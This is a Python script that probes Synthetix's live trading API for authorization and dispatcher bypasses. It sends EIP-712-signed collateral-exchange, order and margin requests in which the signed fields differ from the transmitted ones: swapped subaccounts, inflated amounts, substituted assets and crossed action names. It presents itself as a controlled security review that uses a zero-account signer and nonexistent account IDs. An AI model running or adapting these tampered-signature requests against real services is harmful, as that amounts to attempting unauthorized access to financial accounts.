#!/usr/bin/env python3
"""Controlled Synthetix collateral-exchange dispatcher/authentication differential.

Safety model
------------
* One deterministic EOA is first proven to own/manage/delegate zero Synthetix accounts.
* Every write request targets deliberately nonexistent, valid-range subaccount IDs.
* Fresh nonces and tiny symbolic amounts are used.
* No real account, balance, position, order, withdrawal, transaction, or blockchain state is touched.
* The fixed matrix is rate-limited and stores only redacted response metadata.

Research question
-----------------
Current official documentation exposes both `exchangeCollateral` (fromSymbol/toSymbol/fromAmount)
and `voluntaryCollateralExchange` (sourceAsset/targetUSDTAmount), while the current official SDK
only signs VoluntaryCollateralExchange. This probe determines whether legacy/current action names,
primary types, field sets, account aliases, or generic signatures cross an authorization/dispatcher
boundary.
"""
from __future__ import annotations

import hashlib
import json
import pathlib
import re
import time
import urllib.error
import urllib.request
from dataclasses import dataclass
from typing import Any, Callable

from eth_account import Account
from eth_account.messages import encode_typed_data

OUT = pathlib.Path("synthetix_collateral_exchange_dispatch")
OUT.mkdir(parents=True, exist_ok=True)

INFO_URL = "https://papi.synthetix.io/v1/info"
TRADE_URL = "https://papi.synthetix.io/v1/trade"
UA = "Mozilla/5.0 (compatible; authorized-synthetic-security-review/1.0)"
MAX_BODY = 2 * 1024 * 1024
DELAY = 0.38

ACCOUNT = Account.from_key("0x" + "d3" * 32)
SOURCE_A = 8_300_000_000_071_001
SOURCE_B = 8_300_000_000_071_002
ZERO = "0x0000000000000000000000000000000000000000"

DOMAIN = {
    "name": "Synthetix",
    "version": "1",
    "chainId": 1,
    "verifyingContract": ZERO,
}
DOMAIN_FIELDS = [
    {"name": "name", "type": "string"},
    {"name": "version", "type": "string"},
    {"name": "chainId", "type": "uint256"},
    {"name": "verifyingContract", "type": "address"},
]
VOLUNTARY_FIELDS = [
    {"name": "subAccountId", "type": "uint256"},
    {"name": "sourceAsset", "type": "string"},
    {"name": "targetUSDTAmount", "type": "string"},
    {"name": "nonce", "type": "uint256"},
    {"name": "expiresAfter", "type": "uint256"},
]
LEGACY_FIELDS = [
    {"name": "subAccountId", "type": "uint256"},
    {"name": "fromSymbol", "type": "string"},
    {"name": "toSymbol", "type": "string"},
    {"name": "fromAmount", "type": "string"},
    {"name": "nonce", "type": "uint256"},
    {"name": "expiresAfter", "type": "uint256"},
]
SUBACTION_FIELDS = [
    {"name": "subAccountId", "type": "uint256"},
    {"name": "action", "type": "string"},
    {"name": "nonce", "type": "uint256"},
    {"name": "expiresAfter", "type": "uint256"},
]
ADDRESS_RE = re.compile(r"0x[a-fA-F0-9]{40}")
HEX_RE = re.compile(r"0x[a-fA-F0-9]{64,}")
LARGE_RE = re.compile(r"\b\d{12,}\b")


def sha(value: str | bytes) -> str:
    if isinstance(value, str):
        value = value.encode()
    return hashlib.sha256(value).hexdigest()


def normalize_message(value: Any) -> str | None:
    if value is None:
        return None
    text = str(value)
    text = ADDRESS_RE.sub("<address>", text)
    text = HEX_RE.sub("<hex>", text)
    text = LARGE_RE.sub("<large-number>", text)
    return text[:1500]


def post(url: str, payload: dict[str, Any]) -> tuple[int, bytes, dict[str, str], float]:
    body = json.dumps(payload, separators=(",", ":")).encode()
    request = urllib.request.Request(
        url,
        data=body,
        headers={"User-Agent": UA, "Content-Type": "application/json", "Accept": "application/json"},
        method="POST",
    )
    started = time.monotonic()
    try:
        with urllib.request.urlopen(request, timeout=45) as response:
            raw = response.read(MAX_BODY + 1)
            status = response.status
            headers = dict(response.headers.items())
    except urllib.error.HTTPError as exc:
        raw = exc.read(MAX_BODY + 1)
        status = exc.code
        headers = dict(exc.headers.items()) if exc.headers else {}
    elapsed = time.monotonic() - started
    if len(raw) > MAX_BODY:
        raise RuntimeError("response exceeds safety cap")
    return status, raw, headers, elapsed


def parse_json(raw: bytes) -> Any:
    try:
        return json.loads(raw)
    except Exception:
        return None


def preflight() -> dict[str, Any]:
    status, raw, _, elapsed = post(
        INFO_URL,
        {
            "params": {
                "action": "getSubAccountIds",
                "walletAddress": ACCOUNT.address,
                "includeDelegations": True,
            }
        },
    )
    parsed = parse_json(raw)
    response = parsed.get("response") if isinstance(parsed, dict) else None
    count = 0
    recognized = False
    if isinstance(response, list):
        count = len(response)
        recognized = True
    elif isinstance(response, dict):
        for key in ("subAccountIds", "managedSubAccountIds", "delegatedSubAccountIds"):
            value = response.get(key)
            if isinstance(value, list):
                count += len(value)
                recognized = True
    if status != 200 or not recognized or count != 0:
        raise RuntimeError(f"zero-account preflight failed: status={status}, recognized={recognized}, count={count}")
    return {
        "httpStatus": status,
        "accountCount": count,
        "elapsedMs": round(elapsed * 1000, 2),
        "bodySha256": sha(raw),
    }


def sign(primary: str, fields: list[dict[str, str]], message: dict[str, Any]) -> dict[str, Any]:
    encoded = encode_typed_data(
        full_message={
            "types": {primary: fields},
            "primaryType": primary,
            "domain": DOMAIN,
            "message": message,
        }
    )
    signed = ACCOUNT.sign_message(encoded)
    return {
        "v": signed.v,
        "r": "0x" + format(signed.r, "064x"),
        "s": "0x" + format(signed.s, "064x"),
    }


def envelope(signature: dict[str, Any], nonce: int, expiry: int, params: dict[str, Any]) -> dict[str, Any]:
    return {
        "signature": signature,
        "nonce": nonce,
        "expiresAfter": expiry,
        "params": params,
    }


def voluntary_request(
    nonce: int,
    *,
    primary: str = "VoluntaryCollateralExchange",
    action: str = "voluntaryCollateralExchange",
    signed_account: int = SOURCE_A,
    wire_account: int | None = SOURCE_A,
    account_key: str = "subaccountId",
    source_signed: str = "WETH",
    source_wire: str = "WETH",
    amount_signed: str = "1",
    amount_wire: str = "1",
    include_voluntary_fields: bool = True,
    extra_params: dict[str, Any] | None = None,
) -> dict[str, Any]:
    expiry = nonce + 60_000
    message = {
        "subAccountId": signed_account,
        "sourceAsset": source_signed,
        "targetUSDTAmount": amount_signed,
        "nonce": nonce,
        "expiresAfter": expiry,
    }
    signature = sign(primary, VOLUNTARY_FIELDS, message)
    params: dict[str, Any] = {"action": action, "walletAddress": ACCOUNT.address}
    if wire_account is not None:
        params[account_key] = str(wire_account)
    if include_voluntary_fields:
        params.update({"sourceAsset": source_wire, "targetUSDTAmount": amount_wire})
    if extra_params:
        params.update(extra_params)
    return envelope(signature, nonce, expiry, params)


def legacy_request(
    nonce: int,
    *,
    primary: str = "ExchangeCollateral",
    action: str = "exchangeCollateral",
    signed_account: int = SOURCE_A,
    wire_account: int | None = SOURCE_A,
    account_key: str = "subAccountId",
    from_signed: str = "WETH",
    from_wire: str = "WETH",
    to_signed: str = "USDT",
    to_wire: str = "USDT",
    amount_signed: str = "1",
    amount_wire: str = "1",
    include_legacy_fields: bool = True,
    extra_params: dict[str, Any] | None = None,
) -> dict[str, Any]:
    expiry = nonce + 60_000
    message = {
        "subAccountId": signed_account,
        "fromSymbol": from_signed,
        "toSymbol": to_signed,
        "fromAmount": amount_signed,
        "nonce": nonce,
        "expiresAfter": expiry,
    }
    signature = sign(primary, LEGACY_FIELDS, message)
    params: dict[str, Any] = {"action": action, "walletAddress": ACCOUNT.address}
    if wire_account is not None:
        params[account_key] = str(wire_account)
    if include_legacy_fields:
        params.update({"fromSymbol": from_wire, "toSymbol": to_wire, "fromAmount": amount_wire})
    if extra_params:
        params.update(extra_params)
    return envelope(signature, nonce, expiry, params)


def hybrid_exchange_primary_with_voluntary_fields(nonce: int) -> dict[str, Any]:
    expiry = nonce + 60_000
    message = {
        "subAccountId": SOURCE_A,
        "sourceAsset": "WETH",
        "targetUSDTAmount": "1",
        "nonce": nonce,
        "expiresAfter": expiry,
    }
    signature = sign("ExchangeCollateral", VOLUNTARY_FIELDS, message)
    return envelope(
        signature,
        nonce,
        expiry,
        {
            "action": "exchangeCollateral",
            "subAccountId": str(SOURCE_A),
            "walletAddress": ACCOUNT.address,
            "sourceAsset": "WETH",
            "targetUSDTAmount": "1",
        },
    )


def generic_request(nonce: int, action: str, params: dict[str, Any]) -> dict[str, Any]:
    expiry = nonce + 60_000
    message = {
        "subAccountId": SOURCE_A,
        "action": action,
        "nonce": nonce,
        "expiresAfter": expiry,
    }
    signature = sign("SubAccountAction", SUBACTION_FIELDS, message)
    output = {
        "action": action,
        "subAccountId": str(SOURCE_A),
        "walletAddress": ACCOUNT.address,
        **params,
    }
    return envelope(signature, nonce, expiry, output)


@dataclass(frozen=True)
class Case:
    name: str
    family: str
    build: Callable[[int], dict[str, Any]]


CASES = [
    Case("voluntary_sdk_lowercase_account", "voluntary", lambda n: voluntary_request(n)),
    Case("voluntary_camel_account", "voluntary", lambda n: voluntary_request(n, account_key="subAccountId")),
    Case("voluntary_account_omitted", "voluntary", lambda n: voluntary_request(n, wire_account=None)),
    Case("voluntary_signed_A_wire_B", "voluntary", lambda n: voluntary_request(n, wire_account=SOURCE_B)),
    Case("voluntary_signed_amount1_wire999", "voluntary", lambda n: voluntary_request(n, amount_wire="999")),
    Case("voluntary_signed_WETH_wire_WBTC", "voluntary", lambda n: voluntary_request(n, source_wire="WBTC")),
    Case("legacy_exchange_primary", "legacy", lambda n: legacy_request(n)),
    Case("legacy_exchange_lowercase_account", "legacy", lambda n: legacy_request(n, account_key="subaccountId")),
    Case("legacy_exchange_primary_collateralexchange", "legacy", lambda n: legacy_request(n, primary="CollateralExchange")),
    Case("legacy_account_omitted", "legacy", lambda n: legacy_request(n, wire_account=None)),
    Case("legacy_signed_A_wire_B", "legacy", lambda n: legacy_request(n, wire_account=SOURCE_B)),
    Case("legacy_amount1_wire999", "legacy", lambda n: legacy_request(n, amount_wire="999")),
    Case("legacy_from_WETH_wire_WBTC", "legacy", lambda n: legacy_request(n, from_wire="WBTC")),
    Case("legacy_to_USDT_wire_WETH", "legacy", lambda n: legacy_request(n, to_wire="WETH")),
    Case(
        "exchange_action_voluntary_signature_voluntary_fields",
        "cross",
        lambda n: voluntary_request(n, action="exchangeCollateral", account_key="subAccountId"),
    ),
    Case(
        "exchange_action_voluntary_signature_legacy_fields",
        "cross",
        lambda n: voluntary_request(
            n,
            action="exchangeCollateral",
            account_key="subAccountId",
            include_voluntary_fields=False,
            extra_params={"fromSymbol": "WETH", "toSymbol": "USDT", "fromAmount": "1"},
        ),
    ),
    Case(
        "voluntary_action_legacy_signature_legacy_fields",
        "cross",
        lambda n: legacy_request(n, action="voluntaryCollateralExchange", account_key="subaccountId"),
    ),
    Case(
        "voluntary_action_legacy_signature_voluntary_fields",
        "cross",
        lambda n: legacy_request(
            n,
            action="voluntaryCollateralExchange",
            account_key="subaccountId",
            include_legacy_fields=False,
            extra_params={"sourceAsset": "WETH", "targetUSDTAmount": "1"},
        ),
    ),
    Case("exchange_primary_with_voluntary_fields", "cross", hybrid_exchange_primary_with_voluntary_fields),
    Case(
        "exchange_both_field_sets_consistent",
        "cross",
        lambda n: legacy_request(
            n,
            extra_params={"sourceAsset": "WETH", "targetUSDTAmount": "1"},
        ),
    ),
    Case(
        "exchange_both_field_sets_conflicting",
        "cross",
        lambda n: legacy_request(
            n,
            extra_params={"sourceAsset": "WBTC", "targetUSDTAmount": "999"},
        ),
    ),
    Case(
        "voluntary_both_field_sets_conflicting",
        "cross",
        lambda n: voluntary_request(
            n,
            extra_params={"fromSymbol": "WBTC", "toSymbol": "WETH", "fromAmount": "999"},
        ),
    ),
    Case(
        "exchange_generic_subaccount_action",
        "generic",
        lambda n: generic_request(
            n,
            "exchangeCollateral",
            {"fromSymbol": "WETH", "toSymbol": "USDT", "fromAmount": "1"},
        ),
    ),
    Case(
        "voluntary_generic_subaccount_action",
        "generic",
        lambda n: generic_request(
            n,
            "voluntaryCollateralExchange",
            {"sourceAsset": "WETH", "targetUSDTAmount": "1"},
        ),
    ),
    Case(
        "place_isolated_order_surface",
        "hidden",
        lambda n: generic_request(
            n,
            "placeIsolatedOrder",
            {"symbol": "BTC-USDT", "side": "buy", "orderType": "limitGtc", "price": "1", "quantity": "0.001"},
        ),
    ),
    Case(
        "modify_order_batch_surface",
        "hidden",
        lambda n: generic_request(n, "modifyOrderBatch", {"orders": []}),
    ),
    Case(
        "update_isolated_margin_surface",
        "hidden",
        lambda n: generic_request(n, "updateIsolatedMargin", {"symbol": "BTC-USDT", "amount": "1"}),
    ),
]


def summarize(case: Case, status: int, raw: bytes, headers: dict[str, str], elapsed: float) -> dict[str, Any]:
    parsed = parse_json(raw)
    error = parsed.get("error") if isinstance(parsed, dict) else None
    message = error.get("message") if isinstance(error, dict) else error
    code = error.get("code") if isinstance(error, dict) else None
    normalized = normalize_message(message)
    raw_text = raw.decode("utf-8", errors="replace")
    abbreviated = ACCOUNT.address[:6] + "..." + ACCOUNT.address[-4:]
    return {
        "name": case.name,
        "family": case.family,
        "httpStatus": status,
        "elapsedMs": round(elapsed * 1000, 2),
        "apiStatus": parsed.get("status") if isinstance(parsed, dict) else None,
        "errorCode": code,
        "messageRedacted": normalized,
        "normalizedMessageSha256": sha(normalized) if normalized else None,
        "bodySha256": sha(raw),
        "bodyBytes": len(raw),
        "mentionsSyntheticSigner": ACCOUNT.address.lower() in raw_text.lower() or abbreviated.lower() in raw_text.lower(),
        "requestIdPresent": bool(
            (parsed.get("request_id") if isinstance(parsed, dict) else None)
            or headers.get("X-Request-Id")
            or headers.get("x-request-id")
        ),
    }


def main() -> None:
    pf = preflight()
    base_nonce = int(time.time() * 1000)
    results: list[dict[str, Any]] = []
    for index, case in enumerate(CASES):
        nonce = base_nonce + index * 11 + 1
        payload = case.build(nonce)
        results.append(summarize(case, *post(TRADE_URL, payload)))
        (OUT / "progress.json").write_text(
            json.dumps({"processed": index + 1, "total": len(CASES)}, indent=2), encoding="utf-8"
        )
        if index + 1 < len(CASES):
            time.sleep(DELAY)

    recognized_exchange = [
        item["name"]
        for item in results
        if item["name"].startswith("legacy_") or item["name"].startswith("exchange_")
        if not (
            item.get("errorCode") in {"INVALID_FORMAT", "VALIDATION_ERROR"}
            and item.get("messageRedacted")
            and any(token in item["messageRedacted"].lower() for token in ("unknown action", "invalid action", "request type"))
        )
    ]
    auth_reached = [
        item["name"]
        for item in results
        if item.get("httpStatus") == 401 or item.get("errorCode") == "UNAUTHORIZED" or item.get("mentionsSyntheticSigner")
    ]
    output = {
        "safety": "Deterministic zero-account signer; nonexistent account IDs; fixed low-noise matrix; no request can mutate state.",
        "officialCurrentAction": "voluntaryCollateralExchange",
        "documentedAdditionalAction": "exchangeCollateral",
        "syntheticAddressSha256": sha(ACCOUNT.address.lower()),
        "preflight": pf,
        "caseCount": len(results),
        "exchangeLikeCasesNotRejectedAsUnknownAction": recognized_exchange,
        "casesReachingAuthorizationLikeStage": auth_reached,
        "results": results,
    }
    (OUT / "summary.json").write_text(json.dumps(output, indent=2, sort_keys=True), encoding="utf-8")
    print(
        json.dumps(
            {
                "caseCount": len(results),
                "exchangeLikeCasesNotRejectedAsUnknownAction": recognized_exchange,
                "casesReachingAuthorizationLikeStage": auth_reached,
                "statuses": {item["name"]: item["httpStatus"] for item in results},
                "codes": {item["name"]: item["errorCode"] for item in results},
                "messages": {item["name"]: item["messageRedacted"] for item in results},
            },
            indent=2,
        )
    )


if __name__ == "__main__":
    main()
